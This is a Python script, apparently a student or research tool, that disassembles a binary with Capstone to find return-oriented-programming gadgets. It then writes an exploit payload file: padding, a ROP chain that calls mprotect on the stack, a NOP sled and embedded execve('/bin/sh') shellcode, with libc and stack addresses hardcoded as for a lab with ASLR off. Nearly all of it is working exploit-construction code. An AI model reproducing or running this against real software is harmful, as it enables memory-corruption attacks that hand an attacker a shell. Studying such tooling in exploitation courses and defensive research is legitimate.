import os, sys
import collections
import pprint
import re
import struct
import platform
from capstone import *
from capstone.x86 import *

MAX_GADGET_LEN = 6
MAX_GADGETS = 10000
MAX_INSTRUCTION_LEN = 10
MAX_SCANS = 6
GADGET_TYPES = ["ret", "int"]
BINARY_RET = "0xc3"
JUNK = 0x41 #"A"
FILTER_INSTR = ["enter", "leave", "push", ".byte", "call"]
PADDING = "AAAAAAAAAAAAAAAAAAAAAAAA"
LIBC = 0x7ffff7a0e000
#we need gadgets to set these regs, and one to call syscall
REQUIRED_GADGETS = ["rax", "rdi", "rsi", "rdx"]
SHELLCODE_ADDR = 0x7fffffffe49f
NOP = "\x90"
SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
MPROTECT_ARGS = {"rax": 10, "rdi": 0x7fffffffe000, "rsi": 4096, "rdx": 4} #rdi should be address of shellcode

class GadgetList:
    def __init__(self, logfile):
        self.set = set()
        self.gadgets = dict()
        self.size = 0
        self.out = logfile
        self.useful_gadgets = dict()
        self.popret = dict()
        for t in GADGET_TYPES:
            self.gadgets[t] = list()

        for g in REQUIRED_GADGETS:
            self.popret[g] = None
            self.useful_gadgets[g] = list()
        self.useful_gadgets["syscall"] = list()
        self.popret["syscall"] = None

    def serializeInstructions(self, gadget):
        seq = list()
        for i in gadget:
            if i: #skip None
                tup = (i[1], i[2])
                seq.append(tup)

        h = hash(tuple(seq))
        return h

    def createROPChain(self):
        chain = []
        required = []
        #sort so smallest chain is first
        for v in self.useful_gadgets.values():
            v.sort(key=lambda x: len(x))

        if len(self.useful_gadgets["syscall"]) == 0:
            print("ERROR: Cannot find gadget for syscall!")
            return None

        independent_gadgets = dict()
        for req in REQUIRED_GADGETS:
            if req not in self.useful_gadgets:
                print("ERROR: cannot find gadget to setup %s" % reg)
                return None

            gadget = self.findPopRet(self.useful_gadgets[req])
            if gadget:
                independent_gadgets[req] = gadget
            else:
                required.append(req)

        # at this point, all easy (pop ; ret) gadgets are added to chain.
        # if rax is still needed, search for (xor ; add 1) chain.
        #if "rax" in required:
        #    gadget = self.findXorAddChain(self.useful_gadgets["rax"])

        # TODO if a simple pop gadget cannot be found, try finding a simple mov gadget
        # search through longer pop chains as long as they dont mess up stack
        conflict_regs = []
        found = []
        for req in required:
            options = self.useful_gadgets[req]
            for option in options:
                first = option[0]
                if first[1] == "pop": #or mov
                    regs = self.getConflictingRegs(option[1:], independent_gadgets.keys())
                    for reg in regs:
                        if reg in conflict_regs:
                            #cant use this gadget b/c we need it
                            continue
                        conflict_regs.append(reg)
                    found.append(req)
                    chain.append((req, option))
                    break

        for f in found:
            required.remove(f)

        if len(required) > 0:
            print("ERROR: Unable to find gadgets for: %s" % required)

        stack = []
        print("\nDependent Gadgets:")
        for (register, gadget) in chain:
            print(self.getGadgetInfo(gadget))
            stack += self.formatPopArgs(gadget, register)

        print("\nIndependent Gadgets:")
        for (register, gadget) in independent_gadgets.iteritems():
            print(self.getGadgetInfo(gadget))
            stack += self.formatPopArgs(gadget, register)

        syscall = self.useful_gadgets["syscall"][0]
        print(self.getGadgetInfo(syscall))
        stack.append(syscall[0][0] + LIBC)

        print("\nSTACK:")
        with open("ropchain.txt", "wb") as f:
            f.write(PADDING)
            for addr in stack:
                print("0x%x" % int(addr))
                f.write(struct.pack("<Q", int(addr)))
            f.write(struct.pack("<Q", SHELLCODE_ADDR))
            nopsled = NOP * 25
            f.write(nopsled)
            f.write(SHELLCODE)


    def formatPopArgs(self, gadget, register):
        if register not in MPROTECT_ARGS:
            print("Error: Unknown register %s" % register)
            sys.exit(1)

        stack = []
        stack.append(gadget[0][0] + LIBC) #address
        stack.append(MPROTECT_ARGS[register])
        for g in gadget[1:]:
            if g[1] == "pop":
                stack.append(JUNK)
        return stack

    def getConflictingRegs(self, chain, independent_gadgets):
        res = []
        for instr in chain:
            arr = instr[2].split(",")
            for a in arr:
                reg = a.strip(" ")
                if reg in REQUIRED_GADGETS and reg not in independent_gadgets:
                    print("Conflicting Reg %s" % reg)
                    res.append(reg)
        return res

    def findPopRet(self, gadgets):
        for gadget in gadgets:
            if len(gadget) > 2:
                continue #only trying to find simple gadgets...

            i1 = gadget[0]
            i2 = gadget[1]
            if i1[1] != "pop" or i2[1] != "ret":
                continue

            return gadget

        return None

    def addGadget(self, gadget, gadgetID):
        if self.size > MAX_GADGETS:
            print("[*] Exiting early- MAX_GADGETS found")
            sys.exit(1)

        seq = self.serializeInstructions(gadget)
        if seq not in self.set and gadgetID in GADGET_TYPES:
            while None in gadget: #remove Nones
                gadget.remove(None)

            if len(gadget) < 2:
                return False

            self.logGadget(gadget)
            self.checkGadget(gadget);
            self.gadgets[gadgetID].append(gadget)
            self.set.add(seq)
            self.size += 1
            return True

        return False

    def checkGadget(self, gadget):
        for ind in range(0, len(gadget)):
            i = gadget[ind]
            g = list(gadget)[ind:] #only need part of this gadget
            seq = self.serializeInstructions(g)
            if seq in self.set or not g:
                continue
            info = self.getGadgetInfo(g)

            if i[1] == "pop" and i[2].lower() in REQUIRED_GADGETS:
                if len(g) == 2:
                    self.popret[i[2].lower()] = g
                self.useful_gadgets[i[2].lower()].append(g)
                self.set.add(seq)
                print("[*] Found %s Gadget (%s)" % (i[2], info))

            if i[1] == "syscall" and len(g) == 2: #try to find just syscall ; ret
                self.useful_gadgets["syscall"].append(g)
                self.popret["syscall"] = g
                self.set.add(seq)
                print("[*] Found syscall Gadget (%s)" % info)
                return

            if i[1] == "xor" and i[2].lower() == "rax, rax" and len(g) == 2:
                self.useful_gadgets["rax"].append(g)
                self.set.add(seq)
                #print("[*] Found xor Gadget (%s)" % info)
                return

            if i[1] == "add" and len(g) == 2:
                if i[2].lower() == "rax, 1" or i[2].lower() == "al, 1":
                    self.useful_gadgets["rax"].append(g)
                    self.set.add(seq)
                    #print("[*] Found add Gadget (%s)" % info)
                    return

            if i[1] == "mov" and "rax," in i[2].lower() and len(g) == 2:
                self.useful_gadgets["rax"].append(g)
                self.set.add(seq)

    def logGadget(self, gadget):
        s = self.getGadgetInfo(gadget)
        if not s:
            return

        self.out.write(s)
        self.out.write("\n")

    def getGadgetInfo(self, gadget):
        baseAddr = None
        s = ""
        for i in gadget:
            if not i:
                continue
            if not baseAddr:
                baseAddr = i[0]
            s += " %s %s ;" % (i[1], i[2])

        if not baseAddr:
            return None

        addr = "0x%x:" % baseAddr
        return addr + s

    def isReady(self):
        for key, val in self.popret.iteritems():
            if self.popret[key] == None:
                return False
        return True

class GadgetScanner:
    def __init__(self, d, glist):
        self.data = d
        self.gadgetList = glist

    def initScanner(self):
        arch = None
        if platform.architecture()[0] == "32bit":
            arch = CS_MODE_32
        elif platform.architecture()[0] == "64bit":
            arch = CS_MODE_64
        else:
            print("Cannot find platform architecture")
            sys.exit(1)

        md = Cs(CS_ARCH_X86, arch)
        md.skipdata = True
        return md

    def instructionScan(self, data, instruction): #"0xc3"
        hex_data =  " ".join(hex(ord(n)) for n in data)
        #inds = [m.start() for m in re.finditer("0xc3", hex_data)]

        inds = []
        arr = hex_data.split(" ")
        for i in range(0, len(arr)):
            if arr[i] == instruction:
                inds.append(i)

        #blob = MAX_INSTRUCTION_LEN * MAX_GADGET_LEN
        blob = 25
        offsets = []
        for i in inds:
            start = i - blob
            offsets.append((start, i+1))

        print("%d ret instructions found" % len(inds))
        for tup in offsets:
            start = tup[0]
            end = tup[1]
            if start < 0:
                continue
            #print("scanning %d->%d" % (start, end))
            self.scanSection(data[start:end], start)
            if self.gadgetList.isReady():
                return

    def scanSection(self, blob, offset):
        md = self.initScanner()
        start = len(blob) - 2

        for i in range(0, MAX_SCANS):
            if start < 0:
                break
            data = blob[start:]
            instr = md.disasm_lite(data, 0)
            self.handleInstructions(instr, offset + start)
            start -= 2

    def linearScan(self, data, offset=0):
        count = 0
        #md.detail = True
        md = self.initScanner()
        instructions = md.disasm_lite(data, offset)
        self.handleInstructions(instructions)

    def handleInstructions(self, instructions, offset=0):
        gadget = collections.deque([None]*MAX_GADGET_LEN, MAX_GADGET_LEN)

        for (addr, size, mnem, ops) in instructions:
            if mnem in FILTER_INSTR or "j" in mnem or "[" in ops: #filter all jumps, relative instructions
                gadget = collections.deque([None]*MAX_GADGET_LEN, MAX_GADGET_LEN) #reset
                continue

            i = (addr + offset, mnem, ops)
            gadget.append(i)
            #print("0x%x:\t%s\t%s [%d]" % (i[0], i[1], i[2], i.id))
            if i[1] in GADGET_TYPES:
                #print("\t[*] Found %s" % self.gadgetList.getGadgetInfo(gadget))
                if i[1] == "int" and i[2] == "0x80":
                    self.gadgetList.addGadget(gadget,i[1])
                elif "0x" not in i[2]: #dont want call to have certain args
                    self.gadgetList.addGadget(gadget,i[1])
                gadget = collections.deque([None]*MAX_GADGET_LEN, MAX_GADGET_LEN) #reset

def main():

    if len(sys.argv) < 2:
        print("Not enough arguments")
        print("Usage: ropscan [binary]")
        return 1

    if (len(sys.argv) > 2):
        logfile = open(sys.argv[2] + "_gadgets.txt", "w")
    else:
        logfile = open("gadgets.txt", "w")
    with open(sys.argv[1], "rb") as f:
        data = f.read()

    gadgetList = GadgetList(logfile)
    gadgetScanner = GadgetScanner(data, gadgetList);
    gadgetScanner.instructionScan(data, BINARY_RET)
    print("\nROP CHAIN:")
    gadgetList.createROPChain()

    print("\nFound %d Unique Gadgets" % gadgetList.size)
    return 0

if __name__ == '__main__':
    sys.exit(main())
